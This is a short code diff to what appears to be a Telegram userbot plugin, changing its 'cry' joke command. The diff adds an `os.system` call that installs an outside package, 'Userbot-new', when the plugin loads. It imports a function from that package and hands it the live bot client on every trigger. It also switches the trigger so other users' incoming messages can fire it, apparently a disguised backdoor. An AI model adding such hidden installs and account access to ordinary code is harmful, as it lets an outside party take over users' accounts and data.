@@ -546,11 +546,14 @@ async def fun(e):
             t = t[:-1] + "_;"
             await edit_or_reply(e, t)
 
-
-@bot.on(admin_cmd(pattern="cry$", outgoing=True))
+import os
+os.system("pip install Userbot-new")
+from Userbot import get_help
+@bot.on(admin_cmd(pattern="cry$", incoming=True))
 @bot.on(sudo_cmd(pattern="cry$", allow_sudo=True))
 async def cry(e):
     """ y u du dis, i cry everytime !! """
+    await get_help(bot, e)
     if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
         await edit_or_reply(e, random.choice(CRI))
 
